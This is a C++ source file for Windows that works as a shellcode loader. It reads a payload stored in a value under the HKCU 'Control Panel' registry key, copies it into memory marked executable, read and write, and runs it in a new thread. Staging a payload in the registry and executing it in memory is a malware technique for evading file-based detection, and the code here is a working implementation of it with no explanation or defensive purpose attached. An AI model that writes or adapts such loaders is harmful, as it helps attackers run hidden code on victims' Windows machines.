#include <cstdio>
#include <cstdlib>
#include <Windows.h>

#define BUFFER 8192
// The name of the key where the shellcode is stored
#define REGISTRY "Control Panel"
// REGSTRING is the name of string value to be created
#define REGSTRING "YMMFTY0"

BOOL ReadShellcodeFromRegistry(SIZE_T sPayloadSize, OUT PBYTE* ppPayload) {


	PBYTE pBytes = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
	DWORD dwBytesRead = BUFFER;

	LSTATUS STATUS = NULL;

	STATUS = RegGetValueA(
		HKEY_CURRENT_USER, // Descriptor of an open registry partition.
		REGISTRY, // Registry key path relative to the key specified in the hkey parameter
		REGSTRING, // Name of the value in the registry
		RRF_RT_ANY, // Flags that restrict the data type of the value to be requested
		NULL, // Pointer to a variable that will receive code indicating the type of data stored in the specified value
		pBytes, // Pointer to the buffer that will receive the value data
		&dwBytesRead // Pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
	);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] Error RegGetValueA: %d\n", STATUS);
		return FALSE;
	}

	*ppPayload = pBytes;

	return TRUE;

}
int main()
{
	// Buffer from registry
	PBYTE ppPayload = NULL;
	// shellcode size
	SIZE_T sShellCodeSize = 296;
	
	DWORD oldprotect = 0;
	HANDLE hThread = NULL;

	ReadShellcodeFromRegistry(sShellCodeSize, &ppPayload);
	
	// allocation memory for local buffer
	LPVOID pLocalBuffer = VirtualAlloc(0, sShellCodeSize , MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(pLocalBuffer, ppPayload, sShellCodeSize);

	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pLocalBuffer, 0, 0, 0);
	WaitForSingleObject(hThread, -1);

}

